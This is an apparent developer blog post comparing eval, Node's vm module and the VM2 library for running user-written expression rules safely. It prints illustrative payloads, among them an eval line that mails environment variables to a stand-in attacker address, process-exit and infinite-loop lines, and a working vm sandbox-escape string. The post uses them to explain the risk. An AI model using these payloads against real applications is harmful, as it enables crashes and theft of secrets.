---
layout: post
title: "Eval no more: a journey through NodeJS' VM module, VM2 and Expression Language"
date: 2017-03-04 21:28
comments: true
categories: [nodejs, javascript, vm, eval]
description: "A safer alternative to implement expression parsers in NodeJS: let's look at eval, VM and VM2."
---

How many times have you heard of [how evil eval is](https://www.google.ae/search?q=eval&oq=eval&aqs=chrome..69i57j69i60l3j0l2.673j0j7&sourceid=chrome&ie=UTF-8#q=eval+is+evil)? Are there safer alternatives in the modern, server-side JavaScript ecosystem?

<!-- more -->

## The problem with eval

{% img right /images/security.png %}

`eval` is not necessary evil -- you *just* need to make sure you're dealing with
trusted inputs.

The problem lies in that "just", as you can't 100% guarantee that the source of
the eval-ed code (a DB, a file) won't get compromised at any point in time.

Long story short: **consider all code that goes through an `eval` untrusted**.

Here's some funny things `eval` can do:

``` js
// Guess what?
eval('while(true) console.log(1)')
console.log('The application goes on...')

// What if the attacker doesn't want to waste time?
eval('process.exit(0)')
console.log('The application goes on...')

// Let's escalate...
eval('require("node-mailer").mail("attacker@example.com", JSON.stringify(process.ENV))')
console.log('The application goes on...')

// And, for the lolz:
eval('eval = undefined')
console.log('The application goes on...')
```

The last example is the one I like the most: there an attacker would re-define
the `eval` function itself, causing the application to crash (`TypeError: eval is not a function`)
the next time that block of code is executed.

Now that we've seen some basic examples on how you could easily tear down an
application that uses `eval` too eagerly, let's take a step back and try
to figure out when it could be a good idea to execute "external" code
on-the-fly.

## Free the code!

Ever heard of the [expression language](https://en.wikipedia.org/wiki/Unified_Expression_Language), or EL?

It's kind of a specification that defines a programming language used to evaluate
expressions such as:

```
car.maker == 'BMW' // returns a bool
```

as opposed to having to deal with the syntax and quirks of each and every language -- think of
PHP's [dollar sign and weird arrow-syntax](http://phpsadness.com/):

``` php
<?php
$car->getMaker() == 'BMW'
```

{% pullquote %}
Long story short, EL is a very **lightweight programming
language** that provides convenient shortcuts so that **any non-technical person can
write code**: initially thought of as a nicer replacement for writing regular code into HTML
templates, it's been widely used in the Java ecosystem and the [Symfony2 framework](http://symfony.com/doc/current/components/expression_language.html)
popularized it in the PHP world.

Why am I telling you this? Well, because it's damn convenient, as {"you can let
non-programmers customize aspects of your applications through these expressions"}.
For example, imagine someone from your SEO team giving you a human-readable YAML
file like the following:
{% endpullquote %}

``` yaml seo-rules.yml
rules:
  - expr: category("new articles") && country("UK")
    keywords: "latest news, London, Manchester"
  - expr: category("new articles") && country("IT")
    keywords: "ultime notizie, Roma, Milano"
...
```

You can then import it in your application and add keywords to your webpage based
on those conditions -- with code that would look like:

``` js
function category(title) {
  return title === req.category.title
}

function country(code) {
  return code === req.country
}

let keywords = ''
let rules = parse('./rules.yml')

rules.each(rule => {
  try {
    if (eval(rule.expr)) {
      keywords += rule.keywords
    }
  } catch(err) {}
})

```

The advantage of using an expression language is that you don't  need to build
a full fledged CMS to customize various parts of your applications -- import a
file (or a spreadsheet) and you're done.

Doing this in JavaScript is even easier, as expressions are, fundamentally, valid
JS code that can be executed without the need of a [custom parser](http://symfony.com/doc/current/components/expression_language/extending.html).
Let's take a look at some expressions from the [Symfony2 website](http://symfony.com/doc/current/components/expression_language.html):

``` js
product.stock < 15

article.commentCount > 100 && article.category in ["misc"]

data["life"] + data["universe"] + data["everything"]

life + universe + everything
```

These are all **valid examples of JS code**: some operators
work a little bit differently (for example `in` will mainly  work with
objects, not arrays) but, if you're not too creative, you can basically make
sure your expressions are valid JS that can be executed without a custom
parser{% fn_ref 1 %}.

At [Namshi](https://en-ae.namshi.com/), for example, we allow our marketing
team to create voucher codes based on expressions that look like:

``` js
expr: order_subtotal_by_brand("nike", 50, "USD")
discount: 10
type: percent
```

(this would apply a 10% discount if the customer purchases at least 50 USD in Nike
products)

Now, you might think you just found the holy grail that allows you to avoid
building a complicated CMS and let stakeholders write that code for you -- so
you start hacking around, come up with a prototype, everyone is extremely stoked
and it goes into production within a few days. Now your SEO guy can customize
all of the metatags in your pages by simply requesting you to deploy an updated
version of `seo-rules.yml`.

Then, **disaster strikes**.

## Eval is not a sandbox

{% img right /images/expression-language.jpg %}

Even assuming your SEO guy is responsible enough to not make basic mistakes such
as toying around with the file and forgetting a `while` loop in one of the conditions,
you're still facing a potentially high security threat -- a user
might steal the email credentials of our SEO hero and send you a new version of
`seo-rules.yml` that contains dangerous code, asking you to deploy those changes
urgently. Since you trust the SEO guy, you don't even review it, go live and...


...good luck.

{% pullquote %}
The way EL has been implemented in Java, PHP and other languages is within the
context of a sandbox, where "accidental" code cannot do harm outside of the expression.
These languages have lexers, parsers and tokenizers that convert each and every
bit of the expression into a tree and execute it "safely", without letting it
access variables, functions or APIs that haven't been defined while building the
expression itself.

Simply put, let's look at the following example:

```
a === b ? c() : d()
```

An expression evaluator first tries to make sure the
expressions is syntactically valid and then figures out if all its components
are defined: in this case `a`, `b`, `c` and `d` need to be defined
within the context of the expression to be able to execute it.

That makes it so that, generally, we will be required to invoke the expression
like this:

``` js
evaluate(expr, {a, b, c, d})
```

{"If the expression uses a variable that is not defined within its context, the evaluation
will then throw an error, which is exactly what prevents code from breaking out of its intended scope"} to begin
with: `process`, `console`, `fs` and so on won't be available for an attacker to take
advantage of.

Instead, `eval` directly **executes code and has access to the same scope** it's
been called from{% fn_ref 2 %}: since it's missing a sandboxing feature,
it is a very risky and, in my opinion, a poor choice for implementing an expression
evaluator.
{% endpullquote %}

## Enter VM

Now, imagine you could run some JS code in a new "node process" that has no access
to the standard node library -- no `process`, no `console`, just basic plain JS: that's
what the `vm` module lets you do.

Let's take a look at this example:

``` js
const vm = require('vm')

let result = vm.runInNewContext('a + 1', {a: 2})

console.log(result) // 3
```

Here we are asking Node to create a new [V8 context](https://nodejs.org/api/vm.html#vm_what_does_it_mean_to_contextify_an_object) and run a bunch of code
(`a + 1`) there for us, passing an object that constitutes the global environment of
that new context (`{a: 2}`).

Note that the current execution context is not affected by what happens in that
new context:

``` js
let a = 0;
let result = vm.runInNewContext('a += 1', {a})

console.log(a) // 0
```

unless you specifically tell the VM that you want to re-use an existing context
or to use the current context with `vm.runInThisContext`:

``` js
a = 0;
vm.runInThisContext('a += 1')

console.log(a) // 1
```

When you use the current execution context (`runInThisContext`)
the executed code is going to have access to globally-defined variables of the current
context which, of course, exposes us to the same kind of problems we'd have with
`eval`:

``` js
a = 0;
let result = vm.runInThisContext('process.exit(0)')

console.log(result) // this will never run
```

So, let's stick to running our code on brand new execution contexts through `vm.runInNewContext`.

A nice "feature" of new contexts is that, by default, they can only be used to
execute plain old JS, as they don't have access to functions / node modules
unless **you** inject those in the context.

You can try it out for yourself in node's REPL:

``` js
~ (master ✔) ᐅ node
> vm.runInNewContext('1 + 1')
2

> vm.runInNewContext('1 + a')
ReferenceError: a is not defined
    at evalmachine.<anonymous>:1:5
    at ContextifyScript.Script.runInContext (vm.js:37:29)
    at ContextifyScript.Script.runInNewContext (vm.js:43:15)
    at Object.exports.runInNewContext (vm.js:74:17)
    at repl:1:4
    at realRunInThisContextScript (vm.js:22:35)
    at sigintHandlersWrap (vm.js:98:12)
    at ContextifyScript.Script.runInThisContext (vm.js:24:12)
    at REPLServer.defaultEval (repl.js:346:29)
    at bound (domain.js:280:14)

> vm.runInNewContext('1 + a', {a: 1})
2

> vm.runInNewContext('console.log(123)')
ReferenceError: console is not defined
    at evalmachine.<anonymous>:1:1
    at ContextifyScript.Script.runInContext (vm.js:37:29)
    at ContextifyScript.Script.runInNewContext (vm.js:43:15)
    at Object.exports.runInNewContext (vm.js:74:17)
    at repl:1:4
    at realRunInThisContextScript (vm.js:22:35)
    at sigintHandlersWrap (vm.js:98:12)
    at ContextifyScript.Script.runInThisContext (vm.js:24:12)
    at REPLServer.defaultEval (repl.js:346:29)
    at bound (domain.js:280:14)

> vm.runInNewContext('console.log(123)', {console})
123
undefined

> vm.runInNewContext('log("lol")', console)
lol
undefined
>
```

One of the hidden features of the `vm` module is that it uses implicit returns,
which means that **the return value of the expression is available to the main
execution context**. As we've already seen:

``` js
let result = vm.runInNewContext('Math.random() * 1000')
console.log(result) // 802.4222332991689
```

In fact, if you try to return "manually" you'll get a slap in the face:

``` js
let result = vm.runInNewContext('return Math.random() * 1000')
...
evalmachine.<anonymous>:1
return Math.random() * 1000
^^^^^^
SyntaxError: Illegal return statement
```

But implicit returns don't just stop there -- as you can write multiple
expressions and `vm` will make sure you get the return value of the last
block, even if you split your "code" into multiple lines:

``` js
let code  = `
let a = 1
let b = a
a + b
`
let result = vm.runInNewContext(code)
console.log(result) // 2
```

The other **killer feature** of the `vm` module is that it's able to **specify
timeouts for the scripts it executes**:

``` js
vm.runInNewContext(`while (true) 1`, {}, {timeout: 3})

Error: Script execution timed out.
    at ContextifyScript.Script.runInContext (vm.js:37:29)
    at ContextifyScript.Script.runInNewContext (vm.js:43:15)
    at Object.exports.runInNewContext (vm.js:74:17)
    at repl:1:4
    at realRunInThisContextScript (vm.js:22:35)
    at sigintHandlersWrap (vm.js:98:12)
    at ContextifyScript.Script.runInThisContext (vm.js:24:12)
    at REPLServer.defaultEval (repl.js:346:29)
    at bound (domain.js:280:14)
    at REPLServer.runBound [as eval] (domain.js:293:12)
```

In the above scenario, we're giving the script 3 milliseconds to execute
and, since it's trying to execute an infinite `while` loop, `vm` throws
an error and gives us an opportunity to catch it:

``` js
try {
    return vm.runInNewContext(`while (true) 1`, {}, {timeout: 3})
} catch(err) {
    // err could be a syntax error, timeout, etc
    console.error(err)

    return null
}
```

It's worth noting that the VM API is synchronous, so please be mindful
when assigning timeouts as you might end up stalling for too long.

## Performance overhead

{% pullquote %}
Of course, running code in a separate context requires quite some
overhead compared to running an `eval`: we need V8 to setup the context,
compile the code on-the-fly and, finally, execute it -- and the whole process
doesn't come very cheap.

Let's look at a simple benchmark that loops 1k times over an eval / vm
instruction and records the total time it takes for
the loop to complete{% fn_ref 3 %}:

``` js eval-vs-vm.js
let a = 0;
let i = 0;

console.time('eval')

for (i; i < 1000; i++) {
  eval('a++')
}

console.timeEnd('eval')

let b = 0;
let vm = require('vm');
i = 0;

console.time('vm')

for (i; i < 1000; i++) {
  vm.runInNewContext('b++', {b})
}

console.timeEnd('vm')
```

Even though this benchmark is not very scientific, it should give us a good idea
of the differences between the two, if any:

``` bash
/tmp ᐅ node eval-vs-vm.js
eval: 1.120ms
vm: 468.136ms
```

Holy moly, we're talking 1ms vs half a second here!

We could probably get some
better results if we re-use contexts rather than creating new ones in each
and every loop cycle but, at the end of the day, I think that would be pointless
as this is, of course, a provoking benchmark -- **{"never trade security for speed"}**.
{% endpullquote %}

In addition, I truly don't think you'll be evaluating thousands of expressions
on every request, so the slowdown of using the VM module might look more
like this:

``` bash
/tmp ᐅ node
> console.time('r'); vm.runInNewContext('1 + 1', {}); console.timeEnd('r')
r: 1.778ms
```

Still expensive, but very minimal in the context of a request / response cycle{% fn_ref 4 %}.

## Are we good to go using VM? Surprise surprise!

{% img right /images/facepalm.jpg %}

You came all the way down here thinking `vm` solved all of your problems, just
like I did: when it comes to security, though, I always want to double and triple
check to make sure I'm really considering the safest solution and, after some
digging around, I had one of those facepalm moments, as **vm might not be safe
enough**.

Consider this trick:

``` js
vm.runInNewContext("this.constructor.constructor('return process')().exit()")
console.log("The app goes on...")
```

Unfortunately, this is a valid exploit that will likely never get fixed -- the
VM module is to be considered [a sandbox, not a jail](https://github.com/nodejs/node-v0.x-archive/issues/2486#issuecomment-3420936),
meaning that it can't really screw around with the current context but it can
very well access the standard JS APIs and the global NodeJS environment, providing a straightforward attack vector
similar to what you'd end up with by using `eval`.

One way to make sure that VM can't use this funny trick to access globals is by
making sure the context is only made of primitives:

``` js
let ctx = Object.create(null)
ctx.a = 1
vm.runInNewContext("this.constructor.constructor('return process')().exit()", ctx)
```

What we're doing here is to create a "special" context that does not have a
prototype (`Object.create(null)`), thus removing the ability to access
constructors and prototypes:

``` js
vm.runInNewContext("this.constructor.constructor('return process')().exit()", ctx)

// same as

vm.runInNewContext("this.__proto__.constructor.constructor('return process')().exit()", ctx)
```

The above code will throw the `ReferenceError: process is not defined` error, but will
still be vulnerable if we add non-primitives in the context:

``` js
let ctx = Object.create(null)
ctx.a = function(){}
vm.runInNewContext("this.a.constructor.constructor('return process')().exit()", ctx)
```

Unless you can afford to only use primitives in our context, we're back to square
one, left with no way to safely execute untrusted JS code.

And, by the way, this isn't likely to change soon as it's been [there for ages](http://grokbase.com/t/gg/nodejs/1273tqtcsk/sandboxing-using-vm-module-wrapping-require-process-binding).
Worse of all, most people still assume `vm` is safe (see [here](https://github.com/hacksparrow/safe-eval#what-is-this)
and [here](https://www.quora.com/What-are-the-use-cases-for-the-Node-js-vm-core-module)),
which means there might be tons of applications out there that are vulnerable to
this kind of attack.

## Enter VM2

As I briefly explained in the previous paragraph, I was doing some digging
around to see if `vm`'s sandbox could still be exploited when I found myself
on [this gist](https://gist.github.com/domenic/d15dfd8f06ae5d1109b0) which
eventually led me to the [VM2 library on github](https://github.com/patriksimek/vm2).

Curious on what would this module add on top of `vm`'s default behavior,
[I asked](https://github.com/patriksimek/vm2/issues/59)
only to find that it actually secures the sandbox through some custom security checks (mainly using [proxies](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/Proxy)):

``` bash
/tmp ᐅ node

> const {VM} = require('vm2');
undefined

> new VM().run('this.constructor.constructor("return process")().exit()');
ReferenceError: process is not defined
    at eval (eval at <anonymous> (vm.js:1:18), <anonymous>:2:8)
    at vm.js:1:47
    at ContextifyScript.Script.runInContext (vm.js:32:29)
    at VM.run (/tmp/node_modules/vm2/lib/main.js:145:72)
    at repl:1:10
    at ContextifyScript.Script.runInThisContext (vm.js:23:33)
    at REPLServer.defaultEval (repl.js:336:29)
    at bound (domain.js:280:14)
    at REPLServer.runBound [as eval] (domain.js:293:12)
    at REPLServer.onLine (repl.js:533:10)
```

Sweet -- we can simply then install [VM2](https://www.npmjs.com/package/vm2)
and start switching all `vm.runInNewContext(...)` to VM2's API:

``` js
let vm = new VM({timeout: 10, sandbox: {a: function(){ return 123 }}})

vm.run('a()') // 123
```

At this point you could probably settle on VM2 and call it a day, but you'd still
need to ask yourself "*what if VM2 contains a vulnerability?*".

All in all, there have been a few [security concerns](https://github.com/patriksimek/vm2/issues/32) with this module as well,
and similar libraries [had the same problems](https://github.com/asvd/jailed/issues/33)
-- to be honest, my gut feeling is that [a new attack vector
might be out there, waiting to be discovered](https://github.com/patriksimek/vm2/issues/32#issuecomment-226581203).

## Conclusion

It's been quite a long read if you've made it this far, so let me leave you
with some key takeaways:

* there are business cases for evaluating external code, on-the-fly
* avoid using `eval` for that, it's **not safe at all**
* node's `vm` module provides a safer implementation, but **it can still be exploited** by an attacker
* [VM2](https://github.com/patriksimek/vm2) appears to provide a more solid sandbox that can't be escaped, but a security issue might lurk [somewhere in the codebase](https://github.com/patriksimek/vm2/issues/32)...

All in all I think the only safe way to run untrusted code is to "physically"
separate your application from that code by, for example, running it in a VM, a docker
container or a [lambda function](http://docs.aws.amazon.com/lambda/latest/dg/API_Invoke.html) on AWS{% fn_ref 5 %}.
If you can't go for this kind of isolation, then I would recommend you to settle
on VM2.

## Last but not least: what about the browser?

Some believe [eval isn't such a threat](http://stackoverflow.com/a/198031/934439)
on the browser, as most clients can anyhow do the same kind of harm through the
DevTools' console. Even though, in principle, that's true, there are some [other
things to consider](http://stackoverflow.com/questions/197769/when-is-javascripts-eval-not-evil#comment19416896_198031)
that might still make `eval` a risky element of your codebase.

One very interesting approach is to use [web workers](http://blog.namangoel.com/replacing-eval-with-a-web-worker),
as they provide a semi-isolated context that cannot interfere with the original
window.

That said, there's still a long way to go until we can safely run an
untrusted piece of code, both on the client and the server.

Perhaps that's for the best ;-)

{% footnotes %}
  {% fn Another example, you should use '&&' and not 'and' %}
  {% fn including the global one because you can just use global.$VAR in Node ¯\\_(ツ)_/¯ %}
  {% fn console.time|timeEnd are amazing for this kind of quick benchmarks %}
  {% fn Unless you are, of course, optimizing for each and every ms. In general, I tend to forget about these optimizations as the bottleneck is usually somewhere in the network, or a DB query, so optimizing for that won't really move the needle %}
  {% fn Using lambda for this would actually make it for a cool proof of concept %}
{% endfootnotes %}